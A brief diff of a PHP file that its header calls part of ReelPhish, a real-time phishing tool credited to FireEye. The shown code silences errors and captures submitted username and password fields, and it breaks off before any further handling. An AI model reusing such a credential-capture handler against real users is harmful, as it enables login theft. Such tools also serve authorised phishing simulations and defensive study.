@@ -1,6 +1,13 @@
 <?php
+/*
+ReelPhish - Automated Real Time Phishing
+
+Authors: Pan Chan, Trevor Haskell
+
+Copyright (C) 2018 FireEye, Inc. All Rights Reserved.
+*/
 	error_reporting(0);
-    if(isset($_POST['username']) && isset($_POST['password'])) {
+	if(isset($_POST['username']) && isset($_POST['password'])) {
           $awrt = $_POST['username'];
           $bwrt = $_POST['password'];
           // For debugging purposes
